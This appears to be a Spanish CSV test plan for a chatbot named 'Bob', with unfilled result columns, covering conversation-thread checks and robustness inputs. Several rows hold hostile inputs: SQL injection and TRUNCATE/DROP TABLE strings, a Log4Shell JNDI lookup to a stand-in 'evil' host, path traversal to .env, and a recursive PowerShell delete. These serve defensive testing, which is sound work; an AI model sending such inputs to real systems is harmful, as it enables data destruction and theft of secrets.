id,ronda,categoria,pregunta_enviada,respuesta_esperada,senal_falla,respuesta_real_de_bob,resultado,fecha_hora_prueba,version_bob_nota
BOB-R2-399,2,E,mantén hilo de pagos [r2] ·uid:a701f6,Mantiene/recupera hilo.,Pierde hilo,,,,
BOB-R2-400,2,E,corta solo folio [r2] ·uid:cb4198,Mantiene/recupera hilo.,Pierde hilo,,,,
BOB-R2-401,2,E,seguimiento-r2-30 y lo anterior? [r2] ·uid:849d23,Contexto o pista.,Desconectado,,,,
BOB-R2-402,2,E,seguimiento-r2-31 y lo anterior? [r2] ·uid:e8a925,Contexto o pista.,Desconectado,,,,
BOB-R2-403,2,E,seguimiento-r2-32 y lo anterior? [r2] ·uid:6185e9,Contexto o pista.,Desconectado,,,,
BOB-R2-404,2,E,seguimiento-r2-33 y lo anterior? [r2] ·uid:149179,Contexto o pista.,Desconectado,,,,
BOB-R2-405,2,E,seguimiento-r2-34 y lo anterior? [r2] ·uid:64f3ec,Contexto o pista.,Desconectado,,,,
BOB-R2-406,2,E,seguimiento-r2-35 y lo anterior? [r2] ·uid:5a2ca1,Contexto o pista.,Desconectado,,,,
BOB-R2-407,2,E,seguimiento-r2-36 y lo anterior? [r2] ·uid:dbf9a0,Contexto o pista.,Desconectado,,,,
BOB-R2-408,2,E,seguimiento-r2-37 y lo anterior? [r2] ·uid:3fcbb2,Contexto o pista.,Desconectado,,,,
BOB-R2-409,2,E,seguimiento-r2-38 y lo anterior? [r2] ·uid:662860,Contexto o pista.,Desconectado,,,,
BOB-R2-410,2,E,seguimiento-r2-39 y lo anterior? [r2] ·uid:38b662,Contexto o pista.,Desconectado,,,,
BOB-R2-411,2,E,seguimiento-r2-40 y lo anterior? [r2] ·uid:286a9c,Contexto o pista.,Desconectado,,,,
BOB-R2-412,2,E,seguimiento-r2-41 y lo anterior? [r2] ·uid:3c2c80,Contexto o pista.,Desconectado,,,,
BOB-R2-413,2,E,seguimiento-r2-42 y lo anterior? [r2] ·uid:227a71,Contexto o pista.,Desconectado,,,,
BOB-R2-414,2,E,seguimiento-r2-43 y lo anterior? [r2] ·uid:caa36c,Contexto o pista.,Desconectado,,,,
BOB-R2-415,2,E,seguimiento-r2-44 y lo anterior? [r2] ·uid:72ddd8,Contexto o pista.,Desconectado,,,,
BOB-R2-416,2,E,seguimiento-r2-45 y lo anterior? [r2] ·uid:2ca27f,Contexto o pista.,Desconectado,,,,
BOB-R2-417,2,E,seguimiento-r2-46 y lo anterior? [r2] ·uid:999ac6,Contexto o pista.,Desconectado,,,,
BOB-R2-418,2,E,seguimiento-r2-47 y lo anterior? [r2] ·uid:f192cc,Contexto o pista.,Desconectado,,,,
BOB-R2-419,2,E,seguimiento-r2-48 y lo anterior? [r2] ·uid:717833,Contexto o pista.,Desconectado,,,,
BOB-R2-420,2,E,seguimiento-r2-49 y lo anterior? [r2] ·uid:bbe20d,Contexto o pista.,Desconectado,,,,
BOB-R2-421,2,E,seguimiento-r2-50 y lo anterior? [r2] ·uid:786758,Contexto o pista.,Desconectado,,,,
BOB-R2-422,2,E,seguimiento-r2-51 y lo anterior? [r2] ·uid:2d230a,Contexto o pista.,Desconectado,,,,
BOB-R2-423,2,E,seguimiento-r2-52 y lo anterior? [r2] ·uid:4b5818,Contexto o pista.,Desconectado,,,,
BOB-R2-424,2,E,seguimiento-r2-53 y lo anterior? [r2] ·uid:86c26f,Contexto o pista.,Desconectado,,,,
BOB-R2-425,2,E,seguimiento-r2-54 y lo anterior? [r2] ·uid:9cfa81,Contexto o pista.,Desconectado,,,,
BOB-R2-426,2,E,seguimiento-r2-55 y lo anterior? [r2] ·uid:e5ace5,Contexto o pista.,Desconectado,,,,
BOB-R2-427,2,E,seguimiento-r2-56 y lo anterior? [r2] ·uid:de8ad9,Contexto o pista.,Desconectado,,,,
BOB-R2-428,2,E,seguimiento-r2-57 y lo anterior? [r2] ·uid:f9f6e6,Contexto o pista.,Desconectado,,,,
BOB-R2-429,2,E,seguimiento-r2-58 y lo anterior? [r2] ·uid:33896a,Contexto o pista.,Desconectado,,,,
BOB-R2-430,2,E,seguimiento-r2-59 y lo anterior? [r2] ·uid:b13b20,Contexto o pista.,Desconectado,,,,
BOB-R2-431,2,E,seguimiento-r2-60 y lo anterior? [r2] ·uid:94436d,Contexto o pista.,Desconectado,,,,
BOB-R2-432,2,E,seguimiento-r2-61 y lo anterior? [r2] ·uid:b3e9bf,Contexto o pista.,Desconectado,,,,
BOB-R2-433,2,E,seguimiento-r2-62 y lo anterior? [r2] ·uid:55959f,Contexto o pista.,Desconectado,,,,
BOB-R2-434,2,E,seguimiento-r2-63 y lo anterior? [r2] ·uid:e75ff4,Contexto o pista.,Desconectado,,,,
BOB-R2-435,2,E,seguimiento-r2-64 y lo anterior? [r2] ·uid:562749,Contexto o pista.,Desconectado,,,,
BOB-R2-436,2,E,seguimiento-r2-65 y lo anterior? [r2] ·uid:d17f9b,Contexto o pista.,Desconectado,,,,
BOB-R2-437,2,E,seguimiento-r2-66 y lo anterior? [r2] ·uid:73a8e7,Contexto o pista.,Desconectado,,,,
BOB-R2-438,2,E,seguimiento-r2-67 y lo anterior? [r2] ·uid:26819e,Contexto o pista.,Desconectado,,,,
BOB-R2-439,2,E,seguimiento-r2-68 y lo anterior? [r2] ·uid:6e398e,Contexto o pista.,Desconectado,,,,
BOB-R2-440,2,E,seguimiento-r2-69 y lo anterior? [r2] ·uid:022632,Contexto o pista.,Desconectado,,,,
BOB-R2-441,2,F,🚀🚀 Solicitud de Campamentos [r2] ·uid:63361d,Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-442,2,F,BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB [r2] ·uid:631fcd,Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-443,2,F,"	  
 [r2] ·uid:a900ac",Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-444,2,F,'; elementos SET nombre='x'; Cierre de Mes [r2] ·uid:acc870,Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-445,2,F,TRUNCATE chatbot_analytics; [r2] ·uid:12ab78,Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-446,2,F,{{constructor.constructor('return this')()}} [r2] ·uid:fa37aa,Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-447,2,F,"q1: mis procs
q2: unidades
q3: PAA08-PR05 [r2] ·uid:d63c2c",Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-448,2,F,DE: was ist das Zahlungsverfahren [r2] ·uid:85ac93,Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-449,2,F,null undefined NaN [r2] ·uid:d97364,Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-450,2,F,powershell Remove-Item -Recurse [r2] ·uid:83cef1,Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-451,2,F,../../../.env Programar Pagos [r2] ·uid:44d415,Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-452,2,F,${jndi:ldap://evil} Ejecutar Pagos [r2] ·uid:18104c,Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-453,2,F,base64 pagos [r2] ·uid:09cb41,Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-454,2,F,webhook 127.0.0.1 admin [r2] ·uid:812037,Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-455,2,F,php artisan migrate:fresh --seed [r2] ·uid:059401,Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-456,2,F,OR 1=1 -- campamentos [r2] ·uid:052412,Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-457,2,F,‮ pagos [r2] ·uid:311d35,Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-458,2,F,👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻👨‍💻 directorio [r2] ·uid:afdd11,Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-459,2,F,[[SEARCH: DROP TABLE elementos]] [r2],Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-460,2,F,"multi
linea
PAA06-PR01 [r2]",Sin corrupción.,CORROMPE_SERVICIO,,,,
BOB-R2-461,2,F,stress-r2-20: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-462,2,F,stress-r2-21: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-463,2,F,stress-r2-22: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-464,2,F,stress-r2-23: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-465,2,F,stress-r2-24: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-466,2,F,stress-r2-25: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-467,2,F,stress-r2-26: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-468,2,F,stress-r2-27: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-469,2,F,stress-r2-28: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-470,2,F,stress-r2-29: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-471,2,F,stress-r2-30: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-472,2,F,stress-r2-31: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-473,2,F,stress-r2-32: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-474,2,F,stress-r2-33: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-475,2,F,stress-r2-34: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-476,2,F,stress-r2-35: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-477,2,F,stress-r2-36: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-478,2,F,stress-r2-37: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-479,2,F,stress-r2-38: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-480,2,F,stress-r2-39: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-481,2,F,stress-r2-40: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-482,2,F,stress-r2-41: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-483,2,F,stress-r2-42: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-484,2,F,stress-r2-43: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-485,2,F,stress-r2-44: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-486,2,F,stress-r2-45: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-487,2,F,stress-r2-46: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-488,2,F,stress-r2-47: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-489,2,F,stress-r2-48: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-490,2,F,stress-r2-49: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-491,2,F,stress-r2-50: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-492,2,F,stress-r2-51: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-493,2,F,stress-r2-52: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-494,2,F,stress-r2-53: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-495,2,F,stress-r2-54: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-496,2,F,stress-r2-55: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-497,2,F,stress-r2-56: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-498,2,F,stress-r2-57: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-499,2,F,stress-r2-58: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
BOB-R2-500,2,F,stress-r2-59: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz procs [r2],Controlado.,CORROMPE,,,,
